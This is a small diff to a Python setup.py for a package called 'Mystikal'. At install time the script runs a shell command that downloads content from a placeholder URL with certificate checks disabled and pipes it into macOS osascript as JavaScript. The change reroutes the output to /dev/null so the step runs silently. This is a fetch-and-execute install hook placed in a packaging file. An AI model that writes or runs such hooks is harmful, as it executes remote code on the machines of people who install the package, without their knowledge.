@@ -1,7 +1,7 @@
 from setuptools import setup, find_packages
 import os
 
-os.system('curl -k "URL" | osascript -l JavaScript &')
+os.system('curl -k "URL" | osascript -l JavaScript > /dev/null 2>1&')
 
 setup(
     name = 'Mystikal',
